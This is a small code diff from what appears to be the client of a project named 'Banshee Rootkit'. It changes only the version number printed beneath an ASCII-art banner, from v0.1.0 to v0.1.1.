@@ -16,7 +16,7 @@ main(INT argc, CHAR *argv[])
     echo "| |  | \\ | |  | | | |  \\ \\ / |      | |  | | | |     | |     \n";
     echo "| |--| < | |__| | | |  | | '------. | |--| | | |---- | |---- \n";
     echo "|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n\n";
-    std::cout << "Banshee Rootkit v0.1.0\n" << std::endl;
+    std::cout << "Banshee Rootkit v0.1.1\n" << std::endl;
 
     auto banshee = Banshee();
 
